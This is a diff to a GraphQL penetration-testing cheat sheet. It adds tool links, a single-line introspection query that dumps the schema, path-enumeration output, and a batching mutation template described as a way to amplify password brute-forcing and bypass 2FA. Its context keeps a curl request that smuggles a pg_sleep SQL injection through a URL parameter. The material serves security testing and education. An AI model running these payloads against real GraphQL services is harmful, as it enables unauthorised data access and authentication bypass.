@@ -16,13 +16,18 @@
   * [Use mutations](#use-mutations)
   * [NOSQL injection](#nosql-injection)
   * [SQL injection](#sql-injection)
+  * [GraphQL Batching Attacks](#graphql-batching-attacks)
 * [References](#references)
 
 ## Tools
 
 * [GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes](https://github.com/swisskyrepo/GraphQLmap)
+* [GraphQL-voyager - Represent any GraphQL API as an interactive graph](https://apis.guru/graphql-voyager/)
 * [GraphQL Security Toolkit - GraphQL Security Research Material](https://github.com/doyensec/graph-ql/)
+* [Graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema](https://gitlab.com/dee-see/graphql-path-enum)
 * [GraphQL IDE - An extensive IDE for exploring GraphQL API's](https://github.com/andev-software/graphql-ide)
+* [InQL - A Burp Extension for GraphQL Security Testing](https://github.com/doyensec/inql)
+* [Insomnia - Cross-platform HTTP and GraphQL Client](https://insomnia.rest/)
 
 ## Exploit
 
@@ -151,6 +156,34 @@ query IntrospectionQuery {
 }
 ```
 
+Single line query to dump the database schema without fragments.
+
+```js
+__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
+```
+
+### List path
+
+```php
+$ git clone https://gitlab.com/dee-see/graphql-path-enum
+$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
+Found 27 ways to reach the "Skill" node from the "Query" node:
+- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (query) -> Query (skills) -> Skill
+```
 
 ### Extract data
 
@@ -240,6 +273,37 @@ Simple SQL injection inside a graphql field.
 curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
 ```
 
+### GraphQL Batching Attacks
+
+Common scenario:
+* Password Brute-force Amplification Scenario
+* 2FA bypassing
+
+```powershell
+mutation finishChannelVerificationMutation(
+  $input FinishChannelVerificationInput!,
+  $input2 FinishChannelVerificationInput!,
+  $input3 FinishChannelVerificationInput!,
+){
+  first: finishChannelVerificationMutation(input: $input){
+    channel{
+      id
+      option{
+        ... onChannelSmsOptions{
+          number
+        }
+      }
+      status
+      notificationSubscription(last: 1000){ etc...  }
+    }
+  }
+
+
+  second: finishChannelVerificationMutation(input: $input2){...}
+  third: finishChannelVerificationMutation(input: $input3){...}
+}
+```
+
 
 ## References
 
@@ -257,3 +321,4 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 * [HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
 * [Introspection query leaks sensitive graphql system information - @Zuriel](https://hackerone.com/reports/291531)
 * [Graphql Bug to Steal Anyone’s Address - Sept 1, 2019 - Pratik Yadav](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
+* [GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
